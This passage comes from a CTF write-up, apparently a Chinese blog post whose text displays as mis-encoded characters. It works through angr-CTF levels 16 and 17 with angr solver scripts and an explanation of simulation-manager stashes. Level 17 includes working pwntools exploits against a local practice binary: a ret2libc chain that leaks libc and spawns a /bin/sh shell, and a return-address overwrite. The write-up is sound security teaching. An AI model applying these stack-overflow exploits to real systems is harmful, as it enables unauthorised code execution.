class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&quot;./16_angr_arbitrary_write&quot;</span><br>    proj = angr.Project(bin_path)<br><br>    <span class="hljs-comment"># hook the scanf to symbolize our input</span><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">SimScanfProcedure</span>(angr.SimProcedure):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, fmtstr, key_addr, chr_arr_addr</span>):<br>            key_bvs = claripy.BVS(<span class="hljs-string">&#x27;key_bvs&#x27;</span>, <span class="hljs-number">4</span> * <span class="hljs-number">8</span>)<br>            chr_arr_bvs = claripy.BVS(<span class="hljs-string">&#x27;chr_arr_bvs&#x27;</span>, <span class="hljs-number">20</span> * <span class="hljs-number">8</span>)<br>            <span class="hljs-keyword">for</span> <span class="hljs-built_in">chr</span> <span class="hljs-keyword">in</span> chr_arr_bvs.chop(bits = <span class="hljs-number">8</span>):<br>                self.state.add_constraints(<span class="hljs-built_in">chr</span> &gt;= <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-built_in">chr</span> &lt;= <span class="hljs-string">&#x27;z&#x27;</span>)<br>            self.state.memory.store(key_addr, key_bvs, <br>                                    endness = proj.arch.memory_endness)<br>            self.state.memory.store(chr_arr_addr, chr_arr_bvs)<br>            self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;key_val&#x27;</span>] = key_bvs<br>            self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;chr_arr_val&#x27;</span>] = chr_arr_bvs<br>            <br>    proj.hook_symbol(<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>, SimScanfProcedure())<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">is_success</span>(<span class="hljs-params">state</span>):<br>        strncpy_plt = <span class="hljs-number">0x80490F0</span><br>        <span class="hljs-keyword">if</span> state.addr != strncpy_plt:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>        strncpy_param1 = state.memory.load(state.regs.esp + <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <br>                                           endness = proj.arch.memory_endness)<br>        strncpy_param2 = state.memory.load(state.regs.esp + <span class="hljs-number">8</span>, <span class="hljs-number">4</span>,<br>                                          endness = proj.arch.memory_endness)<br>        first_8_chr = state.memory.load(strncpy_param2, <span class="hljs-number">8</span>)<br>        password_buffer_addr = <span class="hljs-number">0x58465148</span><br><br>        <span class="hljs-keyword">if</span> state.solver.symbolic(strncpy_param1) <span class="hljs-keyword">and</span> state.solver.symbolic(first_8_chr):<br>            copy_state = state.copy()<br>            copy_state.add_constraints(strncpy_param1 == password_buffer_addr)<br>            copy_state.add_constraints(first_8_chr == <span class="hljs-string">b&#x27;UEQFKBEC&#x27;</span>)<br>            <span class="hljs-keyword">if</span> copy_state.satisfiable():<br>                state.add_constraints(strncpy_param1 == password_buffer_addr)<br>                state.add_constraints(first_8_chr == <span class="hljs-string">b&#x27;UEQFKBEC&#x27;</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    init_state = proj.factory.entry_state()<br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = is_success)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        key_val = solution_state.solver.<span class="hljs-built_in">eval</span>(solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;key_val&#x27;</span>])<br>        chr_arr_val = solution_state.solver.<span class="hljs-built_in">eval</span>(solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;chr_arr_val&#x27;</span>],<br>                                                cast_to=<span class="hljs-built_in">bytes</span>)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_0: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(key_val))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_1: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(chr_arr_val))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>è¿è¡Œå³å¯è·å¾— <code>&quot;Good Job.&quot;</code></p><p><img src="https://s2.loli.net/2022/12/02/LeEl7WNBb3iwxtj.png" alt="image.png"></p><blockquote><p>ç¬”è€…æ„Ÿè§‰è¿™ä¸¤é¢˜åŸºæœ¬ä¸Šä¸€æ¨¡ä¸€æ ·â€¦ä¸çŸ¥é“ä¸ºå•¥ç‰¹åœ°åˆ†æˆä¸¤é“é¢˜-  -</p></blockquote><h2 id="17-angr-arbitrary-jumpï¼šæ ˆæº¢å‡ºåŠ«æŒæ§åˆ¶æµ"><a href="#17-angr-arbitrary-jumpï¼šæ ˆæº¢å‡ºåŠ«æŒæ§åˆ¶æµ" class="headerlink" title="17_angr_arbitrary_jumpï¼šæ ˆæº¢å‡ºåŠ«æŒæ§åˆ¶æµ"></a>17_angr_arbitrary_jumpï¼šæ ˆæº¢å‡ºåŠ«æŒæ§åˆ¶æµ</h2><p>angr-CTF çš„æœ€åä¸€é“é¢˜äº†ï¼Œè¿˜æ˜¯æƒ¯ä¾‹æ‹–å…¥ IDA ä¸­ï¼Œè¿™ä¸€æ¬¡çš„æ ¸å¿ƒé€»è¾‘åœ¨ <code>read_input()</code> å½“ä¸­ï¼Œè€Œè¯¥å‡½æ•°ä»…ä¸ºä¸€ä¸ªç®€å•çš„ <code>&quot;%s&quot;</code> æº¢å‡ºï¼š</p><p><img src="https://s2.loli.net/2022/12/02/YmoRpJWTil4tvHB.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/12/02/xAenrIhSkwaDo2E.png" alt="image.png"></p><p>checksec ä¸€ä¸‹ï¼Œåªå¼€äº†ä¸€ä¸ª NXï¼š</p><p><img src="https://s2.loli.net/2022/12/02/Qh78ie42x5PGnIT.png" alt="image.png"></p><p>ç›´æ¥æ‰“ä¸€å¥— ret2libc ç»„åˆæ‹³ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    p = process(<span class="hljs-string">&quot;./17_angr_arbitrary_jump&quot;</span>)<br>    e = ELF(<span class="hljs-string">&quot;./17_angr_arbitrary_jump&quot;</span>)<br>    libc = ELF(<span class="hljs-string">&quot;/usr/lib/i386-linux-gnu/libc-2.31.so&quot;</span>)<br><br>    payload1 = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x19</span> + p32(<span class="hljs-number">0xdeadbeef</span>)<br>    payload1 += p32(e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p32(e.sym[<span class="hljs-string">&#x27;read_input&#x27;</span>])<br>    payload1 += p32(e.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>    p.sendline(payload1)<br><br>    p.recvuntil(<span class="hljs-string">b&#x27;Enter the password: &#x27;</span>)<br>    puts_got = u32(p.recv(<span class="hljs-number">4</span>))<br>    log.success(<span class="hljs-string">&quot;puts got:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(puts_got)))<br>    libc_base = puts_got - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>    bin_sh_addr = libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>).__next__()<br>    log.success(<span class="hljs-string">&quot;libc base:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br>    log.success(<span class="hljs-string">&quot;bin_sh:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base + bin_sh_addr)))<br><br>    payload2 = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x19</span> + p32(<span class="hljs-number">0xdeadbeef</span>)<br>    payload2 += p32(libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])<br>    payload2 += p32(<span class="hljs-number">0xdeadbeef</span>)<br>    payload2 += p32(libc_base + bin_sh_addr)<br>    p.sendline(payload2)<br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure><p>è¿è¡Œå³å¯ Get shellï¼š</p><p><img src="https://s2.loli.net/2022/12/02/ZTDsOjkgU459GKx.png" alt="image.png"></p><p>â€”â€”ä½†åœ¨ angr-CTF ä¸­å®é™…ä¸Šè¦æ±‚æˆ‘ä»¬è¾“å‡ºçš„æ˜¯ <code>&quot;Good Job.&quot;</code> å­—ç¬¦ä¸²ï¼š(</p><p>é‡æ–°å†çœ‹ä¸€ä¸‹ IDAï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªåä¸º <code>print_good()</code> çš„å‡½æ•°ï¼Œå…¶ä¼šè¾“å‡º <code>&quot;Good Job.&quot;</code> å­—ç¬¦ä¸²</p><p><img src="https://s2.loli.net/2022/12/02/ws5VH6UWhFoT9ye.png" alt="image.png"></p><p>é‚£ä¹ˆæˆ‘ä»¬ç›´æ¥å°†è¿”å›åœ°å€è¦†ç›–ä¸ºè¯¥å‡½æ•°å³å¯ï¼Œexp å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./17_angr_arbitrary_jump&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x19</span> + p32(<span class="hljs-number">0xdeadbeef</span>) + p32(<span class="hljs-number">0x58465168</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>è¿è¡Œå³å¯è·å¾— <code>&quot;Good Job.&quot;</code> </p><p><img src="https://s2.loli.net/2022/12/02/KwuMV92WDmxNqQg.png" alt="image.png"></p><p>â€”â€”ä½†è¿™å¹¶ä¸æ˜¯æˆ‘ä»¬åšè¿™ä¸€é“é¢˜çš„ç›®çš„ï¼Œæˆ‘ä»¬åº”å½“ä½¿ç”¨ angr æ¥æ±‚è§£ï¼šï¼‰</p><p>é‚£ä¹ˆç”¨ angr è¯¥æ€ä¹ˆåšå‘¢ï¼Ÿé¦–å…ˆæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯æˆ‘ä»¬è¿˜æ˜¯å¯ä»¥åˆ©ç”¨ SimProcedure æ¥ hook scanf ä»¥å°†è¾“å…¥ç¬¦å·åŒ–ï¼Œç”±äºè¾“å…¥å­˜åœ¨æº¢å‡ºï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å‡è£…ä¸çŸ¥é“è¾“å…¥åˆ°æ ˆåº•çš„è·ç¦»ï¼Œç›´æ¥å°†ç¬¦å·åŒ–è¾“å…¥è®¾ä¸ºä¸€ä¸ªè¾ƒå¤§é•¿åº¦ï¼Œè‹¥æ— è§£å†ç»§ç»­å¢é•¿å³å¯</p><p>ä½†è¿™é‡Œæˆ‘ä»¬éœ€è¦å®Œæˆçš„æ˜¯åˆ©ç”¨æ ˆæº¢å‡ºæ¥æ§åˆ¶ç¨‹åºè¿›è¡Œè·³è½¬ï¼Œå¯¹äº angr è€Œè¨€è¿™æ ·çš„çŠ¶æ€æ˜¯<strong>ä¸å—çº¦æŸçš„çŠ¶æ€</strong>ï¼ˆ<strong>unconstrained state</strong>ï¼‰ï¼Œ<strong>ä¼šè¢«è‡ªåŠ¨ä¸¢å¼ƒ</strong>ï¼Œå› æ­¤æˆ‘ä»¬è¿˜éœ€è¦æƒ³åŠæ³•è®© angr ä¿ç•™è¿™æ ·çš„çŠ¶æ€</p><h3 id="angr-stash"><a href="#angr-stash" class="headerlink" title="angr stash"></a>angr stash</h3><p>åœ¨ angr å½“ä¸­ï¼Œä¸åŒçš„çŠ¶æ€è¢«ç»„ç»‡åˆ° simulation manager çš„ä¸åŒçš„ stash å½“ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æŒ‰ç…§è‡ªå·±çš„éœ€æ±‚è¿›è¡Œæ­¥è¿›ã€è¿‡æ»¤ã€åˆå¹¶ã€ç§»åŠ¨ç­‰</p><h4 id="â‘ -stash-ç±»å‹"><a href="#â‘ -stash-ç±»å‹" class="headerlink" title="â‘  stash ç±»å‹"></a>â‘  stash ç±»å‹</h4><p>åœ¨ angr å½“ä¸­ä¸€å…±æœ‰ä»¥ä¸‹å‡ ç§ stashï¼š</p><ul><li><code>simgr.active</code>ï¼šæ´»è·ƒçš„çŠ¶æ€åˆ—è¡¨ã€‚åœ¨æœªæŒ‡å®šæ›¿ä»£çš„æƒ…å†µä¸‹ä¼šè¢«æ¨¡æ‹Ÿå™¨é»˜è®¤æ‰§è¡Œ</li><li><code>simgr.deadended</code>ï¼šæ­»äº¡çš„çŠ¶æ€åˆ—è¡¨ã€‚å½“ä¸€ä¸ªçŠ¶æ€æ— æ³•å†è¢«ç»§ç»­æ‰§è¡Œæ—¶ï¼ˆä¾‹å¦‚æ²¡æœ‰æœ‰æ•ˆæŒ‡ä»¤ã€æ— æ•ˆçš„æŒ‡ä»¤æŒ‡é’ˆã€ä¸æ»¡è¶³å…¶æ‰€æœ‰çš„åç»§ï¼ˆsuccessorsï¼‰ï¼‰ä¾¿ä¼šè¢«å½’å…¥è¯¥åˆ—è¡¨</li><li><code>simgr.pruned</code>ï¼šè¢«å‰ªæçš„çŠ¶æ€åˆ—è¡¨ã€‚åœ¨æŒ‡å®šäº† <code>LAZY_SOLVES</code> æ—¶ï¼ŒçŠ¶æ€ä»…åœ¨å¿…è¦æ—¶æ£€æŸ¥å¯æ»¡è¶³æ€§ï¼Œå½“ä¸€ä¸ªçŠ¶æ€åœ¨æŒ‡å®šäº† <code>LAZY_SOLVES</code> æ—¶è¢«å‘ç°æ˜¯ä¸å¯æ»¡è¶³çš„ï¼ˆunsatï¼‰ï¼ŒçŠ¶æ€å±‚ï¼ˆstate hierarchyï¼‰å°†ä¼šè¢«éå†ä»¥ç¡®è®¤åœ¨å…¶å†å²ä¸­æœ€åˆå˜ä¸ºä¸æ»¡è¶³çš„æ—¶é—´ï¼Œè¯¥ç‚¹åŠå…¶æ‰€æœ‰åä»£éƒ½ä¼šè¢«  <em>å‰ªæ</em>  ï¼ˆprunedï¼‰å¹¶æ”¾å…¥è¯¥åˆ—è¡¨</li><li><code>simgr.unconstrained</code>ï¼šä¸å—çº¦æŸçš„çŠ¶æ€åˆ—è¡¨ã€‚å½“åˆ›å»º <code>SimulationManager</code> æ—¶æŒ‡å®šäº† <code>save_unconstrained=True</code>ï¼Œåˆ™è¢«è®¤ä¸º<strong>ä¸å—çº¦æŸçš„</strong>ï¼ˆunconstrainedï¼Œå³æŒ‡ä»¤æŒ‡é’ˆè¢«ç”¨æˆ·æ•°æ®æˆ–å…¶ä»–æ¥æºçš„ç¬¦å·åŒ–æ•°æ®æ§åˆ¶ï¼‰çŠ¶æ€ä¼šè¢«å½’å…¥è¯¥åˆ—è¡¨</li><li><code>simgr.unsat</code>ï¼šä¸å¯æ»¡è¶³çš„çŠ¶æ€åˆ—è¡¨ã€‚å½“åˆ›å»º <code>SimulationManager</code> æ—¶æŒ‡å®šäº† <code>save_unsat=True</code>ï¼Œåˆ™è¢«è®¤ä¸ºæ— æ³•è¢«æ»¡è¶³çš„ï¼ˆunsatisfiableï¼Œå³å­˜åœ¨<strong>çº¦æŸå†²çª</strong>çš„çŠ¶æ€ï¼Œä¾‹å¦‚åœ¨åŒä¸€æ—¶åˆ»è¦æ±‚è¾“å…¥æ—¢æ˜¯<code>&quot;AAAA&quot;</code> åˆæ˜¯ <code>&quot;BBBB&quot;</code>ï¼‰çŠ¶æ€ä¼šè¢«å½’å…¥è¯¥åˆ—è¡¨</li></ul><p>è¿˜æœ‰ä¸€ç§ä¸æ˜¯ stash çš„çŠ¶æ€åˆ—è¡¨â€”â€”<code>errored</code>ï¼Œè‹¥åœ¨æ‰§è¡Œä¸­äº§ç”Ÿäº†é”™è¯¯ï¼Œåˆ™çŠ¶æ€ä¸å…¶äº§ç”Ÿçš„é”™è¯¯ä¼šè¢«åŒ…è£¹åœ¨ä¸€ä¸ª <code>ErrorRecord</code> å®ä¾‹ä¸­ï¼ˆå¯é€šè¿‡ <code>record.state</code> ä¸ <code>record.error</code> è®¿é—®ï¼‰ï¼Œè¯¥ record ä¼šè¢«æ’å…¥åˆ° <code>errored</code> ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>record.debug()</code> å¯åŠ¨ä¸€ä¸ªè°ƒè¯•çª—å£</p><h4 id="â‘¡-stash-æ“ä½œ"><a href="#â‘¡-stash-æ“ä½œ" class="headerlink" title="â‘¡ stash æ“ä½œ"></a>â‘¡ stash æ“ä½œ</h4><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>stash.move()</code> æ¥åœ¨ stash ä¹‹é—´è½¬ç§»æ”¾ç½®çŠ¶æ€ï¼Œç”¨æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>simgr.move(from_stash = <span class="hljs-string">&#x27;unconstrained&#x27;</span>, to_stash = <span class="hljs-string">&#x27;active&#x27;</span>)<br></code></pre></td></tr></table></figure><p>åœ¨è½¬ç§»å½“ä¸­æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡æŒ‡å®š <code>filter_func</code> å‚æ•°æ¥è¿›è¡Œè¿‡æ»¤ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">def</span> <span class="hljs-title function_">filter_func</span>(<span class="hljs-params">state</span>):<br><span class="hljs-meta">... </span>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;arttnba3&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(<span class="hljs-number">1</span>)<br>...<br><span class="hljs-meta">&gt;&gt;&gt; </span>simgr.move(from_stash = <span class="hljs-string">&#x27;unconstrained&#x27;</span>, to_stash = <span class="hljs-string">&#x27;active&#x27;</span>, filter_func = filter_func)<br></code></pre></td></tr></table></figure><p>stash æœ¬è´¨ä¸Šå°±æ˜¯ä¸ª listï¼Œå› æ­¤åœ¨åˆå§‹åŒ–æ—¶æˆ‘ä»¬å¯ä»¥é€šè¿‡å­—å…¸çš„æ–¹å¼æŒ‡å®šæ¯ä¸ª stash çš„åˆå§‹å†…å®¹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>simgr = proj.factory.simgr(init_state,<br><span class="hljs-meta">... </span>    stashes = &#123;<br><span class="hljs-meta">... </span>            <span class="hljs-string">&#x27;active&#x27;</span>:[init_state],<br><span class="hljs-meta">... </span>            <span class="hljs-string">&#x27;found&#x27;</span>:[],<br><span class="hljs-meta">... </span>    &#125;)<br></code></pre></td></tr></table></figure><h3 id="FINAL-EXPLOIT-7"><a href="#FINAL-EXPLOIT-7" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>é‚£ä¹ˆç”±äºæœ¬é¢˜æˆ‘ä»¬éœ€è¦é€šè¿‡æ ˆæº¢å‡ºæ¥æ§åˆ¶ eipï¼Œå±äº unconstrained çš„çŠ¶æ€ï¼Œå› æ­¤<strong>æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨åˆ¤æ–­æ˜¯å¦æ‰¾åˆ°äº† unconstrained çŠ¶æ€</strong>ï¼Œäºæ˜¯ä¸æ­¤å‰ä¸åŒçš„æ˜¯æœ¬é¢˜æˆ‘ä»¬é€šè¿‡ <code>simgr.step()</code> æ¥è¿›è¡Œå•æ­¥æ‰§è¡Œï¼Œè‹¥å…¶ä¸­æŸä¸€æ­¥è·å¾—äº† unconstrained state åˆ™æˆ‘ä»¬éå†å…¶ä¸­çŠ¶æ€å¹¶åˆ¤æ–­æ˜¯å¦å¯ä»¥æ»¡è¶³æ§åˆ¶ eip ä¸ºæŒ‡å®šå€¼çš„çº¦æŸï¼Œè‹¥æ˜¯åˆ™ç›´æ¥æ·»åŠ åˆ° <code>simgr.found</code> åˆ—è¡¨ä¸­å³å¯</p><p>æ•…æœ€ç»ˆçš„è§£é¢˜è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-comment"># filter to check satisfiability</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">filter_func</span>(<span class="hljs-params">state</span>):<br>    print_good_addr = <span class="hljs-number">0x58465168</span><br>    <span class="hljs-keyword">return</span> state.satisfiable(extra_constraints = (state.regs.eip == print_good_addr, ))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&quot;./17_angr_arbitrary_jump&quot;</span><br>    proj = angr.Project(bin_path)<br><br>    <span class="hljs-comment"># hook the scanf to symbolize our input</span><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">SimScanfProcedure</span>(angr.SimProcedure):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, fmtstr, input_addr</span>):<br>            input_bvs = claripy.BVS(<span class="hljs-string">&#x27;input_addr&#x27;</span>, <span class="hljs-number">200</span> * <span class="hljs-number">8</span>)<br>            <span class="hljs-keyword">for</span> <span class="hljs-built_in">chr</span> <span class="hljs-keyword">in</span> input_bvs.chop(bits = <span class="hljs-number">8</span>):<br>                self.state.add_constraints(<span class="hljs-built_in">chr</span> &gt;= <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-built_in">chr</span> &lt;= <span class="hljs-string">&#x27;z&#x27;</span>)<br>            self.state.memory.store(input_addr, input_bvs)<br>            self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;input_val&#x27;</span>] = input_bvs<br>            <br>    proj.hook_symbol(<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>, SimScanfProcedure())<br><br>    <span class="hljs-comment"># create simgr that can save unconstraints</span><br>    init_state = proj.factory.entry_state()<br>    simgr = proj.factory.simgr(init_state, <br>                               save_unconstrained=<span class="hljs-literal">True</span>,<br>                               stashes = &#123;<br>                                   <span class="hljs-string">&#x27;active&#x27;</span>:[init_state],<br>                                   <span class="hljs-string">&#x27;unconstrained&#x27;</span>:[],<br>                                   <span class="hljs-string">&#x27;found&#x27;</span>:[],<br>                               &#125;)<br><br>    <span class="hljs-comment"># simulated execution by steps</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> simgr.found:<br>        <span class="hljs-comment"># no more states for execution</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">not</span> simgr.active) <span class="hljs-keyword">and</span> (<span class="hljs-keyword">not</span> simgr.unconstrained):<br>            <span class="hljs-keyword">break</span><br><br>        <span class="hljs-comment"># check for unconstrained states</span><br>        simgr.move(from_stash = <span class="hljs-string">&#x27;unconstrained&#x27;</span>, <br>                  to_stash = <span class="hljs-string">&#x27;found&#x27;</span>,<br>                  filter_func = filter_func)<br><br>        <span class="hljs-comment"># step to next basic block</span><br>        simgr.step()<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] found &#123;&#125; solution state(s)&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">len</span>(simgr.found)))<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        print_good_addr = <span class="hljs-number">0x58465168</span><br>        solution_state.add_constraints(solution_state.regs.eip == print_good_addr)<br>        input_val = solution_state.solver.<span class="hljs-built_in">eval</span>(solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;input_val&#x27;</span>], <br>                                               cast_to=<span class="hljs-built_in">bytes</span>)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(input_val))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>è¿è¡Œå³å¯è·å¾— <code>&quot;Good Job.&quot;</code></p><p><img src="https://s2.loli.net/2022/12/03/Zf6w1xrNFc5HvLI.png" alt="image.png"></p><p>è‡³æ­¤ï¼Œangr CTF çš„ 18 é“é¢˜ç›®<strong>å…¨éƒ¨å®Œç»“</strong></p><h1 id="0xFF-Whatâ€™s-moreâ€¦"><a href="#0xFF-Whatâ€™s-moreâ€¦" class="headerlink" title="0xFF.Whatâ€™s moreâ€¦"></a>0xFF.Whatâ€™s moreâ€¦</h1><p>ä½œä¸ºç”¨æ¥å…¥é—¨ angr åŸºæœ¬ç”¨æ³•çš„é¢˜ç›®ï¼Œangr CTF è‡ªç„¶ä¸ä¼šå¤ªéš¾ï¼Œä¸è¿‡ç¬”è€…ç¡®ä¹é€šè¿‡ angr ä½“ä¼šåˆ°äº†<strong>ç¬¦å·æ‰§è¡Œè¿™ä¸€æŠ€æœ¯çš„ç¾æ„Ÿæ‰€åœ¨</strong>ï¼ˆè™½ç„¶è¯´è¿™ä¸ªæ„Ÿè§¦å¥½åƒæ¯”è¾ƒç„å­¦ : ) ï¼‰</p><p>ä¸åŒäºä»£ç å®¡è®¡æˆ–æ˜¯æ¯”è¾ƒåâ€œæš´åŠ›â€çš„ fuzzï¼Œç¬¦å·æ‰§è¡Œè¿™ä¸€æŠ€æœ¯è¿˜å‘æˆ‘ä»¬å±•ç°äº†å…·æœ‰åˆ«æ ·ç¾æ„Ÿçš„æ¼æ´æŒ–æ˜ä¸ exp 